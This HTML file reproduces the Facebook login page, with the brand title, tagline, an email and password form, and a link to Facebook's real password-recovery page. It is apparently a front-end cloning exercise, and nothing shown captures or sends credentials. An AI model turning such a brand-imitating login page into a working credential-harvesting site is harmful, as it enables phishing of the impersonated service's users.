<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook - log in or sign up</title>
    <link rel="stylesheet" href="login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj
    7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
</head>
<body>
    <div class="main">
        <div class="left">

            <h1 class="title">facebook</h1>
            <p class="para">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
           <div class="inside">
            <form action="">
                <input type="text" class="email" placeholder="Email address or phone number"><br>
                <input type="password" class="password" placeholder="password"><img src="assets/close.png" 
                    alt="" class="close">
                    
                    <br>
                <button class="login">Log in</button><br>
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget">Forgotten password?</a><br><br>
                <hr>  
                <br>    
                <button class="new-acc">Create new account</button>   
             </form>
           </div>
        </div>
    </div>
 
    <script src="fb.js"></script>
</body>
</html>
